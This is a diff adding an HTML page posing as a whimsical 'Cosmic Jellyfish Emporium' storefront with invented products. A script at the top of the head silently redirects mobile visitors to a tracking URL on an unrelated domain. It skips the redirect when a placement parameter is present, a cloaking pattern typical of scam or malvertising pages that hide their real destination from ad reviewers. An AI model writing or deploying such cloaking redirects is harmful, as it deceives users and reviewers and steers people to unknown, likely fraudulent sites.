@@ -1,0 +1,89 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <script>
+    const urlParams = new URLSearchParams(window.location.search);
+    const utmXXX = urlParams.get("xxx");
+    const s = urlParams.get("s");
+    const ttclid = urlParams.get("ttclid");
+    const isMobileDevice = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
+    const lander = `https://klcxb6.mcgo2.com/visit/dade2563-43ce-4351-9ba3-22961c539221?s1=${s}`;
+    if (utmXXX === "__PLACEMENT__") { }
+    else if (isMobileDevice) { window.location.href = lander; } 
+    else { }
+    </script>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Cosmic Jellyfish Emporium</title>
+    <style>
+        body {
+            font-family: 'Comic Sans MS', cursive;
+            background: linear-gradient(45deg, #FF00FF, #00FFFF);
+            color: #FFFFFF;
+            margin: 0;
+            padding: 0;
+        }
+        .container {
+            display: grid;
+            grid-template-columns: repeat(3, 1fr);
+            grid-gap: 20px;
+            padding: 20px;
+        }
+        header {
+            grid-column: 1 / -1;
+            text-align: center;
+            background-color: rgba(0, 0, 0, 0.5);
+            padding: 20px;
+            border-radius: 15px;
+        }
+        main {
+            grid-column: 1 / 3;
+            background-color: rgba(255, 255, 255, 0.2);
+            padding: 20px;
+            border-radius: 15px;
+        }
+        aside {
+            grid-column: 3 / 4;
+            background-color: rgba(0, 0, 0, 0.3);
+            padding: 20px;
+            border-radius: 15px;
+        }
+        footer {
+            grid-column: 1 / -1;
+            text-align: center;
+            background-color: rgba(0, 0, 0, 0.5);
+            padding: 10px;
+            border-radius: 15px;
+        }
+        h1 {
+            font-size: 3em;
+            text-shadow: 2px 2px 4px #000000;
+        }
+        a {
+            color: #FFFF00;
+            text-decoration: none;
+        }
+        a:hover {
+            text-decoration: underline;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <header>
+            <h1>Cosmic Jellyfish Emporium</h1>
+        </header>
+        <main>
+            <h2>Welcome to our Interdimensional Marketplace</h2>
+            <p>Discover the wonders of the universe through our curated selection of cosmic jellyfish and their byproducts. From bioluminescent jellies to time-warping tentacles, we have it all!</p>
+        </main>
+        <aside>
+            <h3>Jellyfish of the Day</h3>
+            <p>The Chrono-Ripple Jellyfish: Known for its ability to create temporal distortions, this jellyfish is perfect for those looking to add a little timey-wimey to their aquarium.</p>
+        </aside>
+        <footer>
+            <p>&copy; 2023 Cosmic Jellyfish Emporium. All rights reserved. | <a href="https://tokreward.com/privacy.html">Privacy Policy</a></p>
+        </footer>
+    </div>
+</body>
+</html>
